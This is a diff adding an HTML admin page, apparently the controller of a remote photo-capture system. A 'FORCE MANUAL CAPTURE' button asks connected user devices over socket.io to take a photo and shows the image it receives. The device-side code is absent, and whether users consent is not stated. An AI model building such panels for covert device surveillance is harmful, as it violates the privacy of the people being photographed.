@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1e1e1e;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            background: #2d2d2d;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        button {
+            background-color: #ff1744;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        button:hover { background-color: #d50000; }
+        .preview-box {
+            margin-top: 20px;
+            border: 2px dashed #555;
+            padding: 10px;
+            border-radius: 8px;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        img {
+            max-width: 100%;
+            border-radius: 6px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>👑 Admin Dashboard</h2>
+        <p>User Device Control Panel</p>
+        
+        <button id="captureBtn">FORCE MANUAL CAPTURE</button>
+
+        <h3>Live Output:</h3>
+        <div class="preview-box">
+            <img id="outputImage" src="" alt="Capture output display" style="display:none;">
+            <span id="placeholderText">No photo received yet</span>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const captureBtn = document.getElementById('captureBtn');
+        const outputImage = document.getElementById('outputImage');
+        const placeholderText = document.getElementById('placeholderText');
+
+        captureBtn.addEventListener('click', () => {
+            socket.emit('admin-trigger-capture');
+            placeholderText.innerText = "Requesting Capture...";
+        });
+
+        socket.on('send-photo-to-admin', (imageData) => {
+            outputImage.src = imageData;
+            outputImage.style.display = 'block';
+            placeholderText.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
